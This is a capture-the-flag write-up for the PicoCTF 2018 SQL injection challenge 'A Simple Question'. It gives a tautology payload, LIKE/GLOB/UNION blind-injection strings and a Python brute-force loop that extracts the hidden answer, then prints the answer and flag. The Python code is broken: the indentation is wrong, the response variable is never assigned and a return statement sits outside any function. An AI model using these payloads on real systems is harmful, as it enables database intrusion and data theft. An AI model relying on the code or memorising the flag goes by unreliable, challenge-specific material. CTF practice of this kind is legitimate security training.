# SQL Injection
PicoCTF 2018 A Simple Question

## Problem
There is a website running at http://2018shell1.picoctf.com:2644/ . Try to see if you can answer its question
## Solution
![](https://i.imgur.com/J3fhQiJ.png)
In the website, we can only see a single input form. Typing arbitrary answer to test, we will get
```php
SQL query: SELECT * FROM answers WHERE answer='f'
Wrong
```
as response, which indicates this is probably a sql injection problem.





Then we can use a common SQL method: `' or 'x'='x` to test and get the following result. 
(noted that`' or 'x'='x` provides a TRUE boolean value to the php.)
```php
SQL query: SELECT * FROM answers WHERE answer='' or 'x'='x'
You are so close.
```
According to the result, we can further confirm the input will be taken as a part of php. Therefore we can start programming to solve the problem.

In php`LIKE '{ }%'` can be used to find out whether the string is starting from the substring in the bracket. We can use this method write a small program in python. Making different requests to guess the string.
```python3=
params = {
'answer': "' OR answer LIKE '"+final+chr(i)+"%", 'debug': '1'
}
```

I simply use the brute force way to find out the answer. Using a for loop among all the characters, if I guess the first character right, I add the character to the answer string and keep guessing.
```python3=
for i in range(0x20, 0x7f):
    if  i!=37: # '%:37'
        requests.post('http://2018shell1.picoctf.com:2644/answer2.php', data=params)
	res = r.text

        if 'Wrong' in res:
        print(final,chr(i),"Wrong")
        if 'You are so close.' in res:
        final += chr(i)
        print (final,"Correct")
        break
        elif i == 0x7e:
        return final
```

If the loop goes through all the characters (line 12 ) and still don't revieve the "You are so close." response, it means the previous string is the final answer.

I then later find out that LiKE does not differ uppercase and lowercase, so I revise the sql and use GLOB which differs those two.
```python3=
'answer': "' UNION SELECT * FROM answers WHERE answer GLOB '{}{}*'; --".format(final, chr(i))
```
At the end, the answer is `Answer 41AndSixSixths`
Copy it to the input and get the flag
```
SQL query: SELECT * FROM answers WHERE answer='41AndSixSixths'
Perfect!
Your flag is: picoCTF{qu3stions_ar3_h4rd_28fc1206}
```






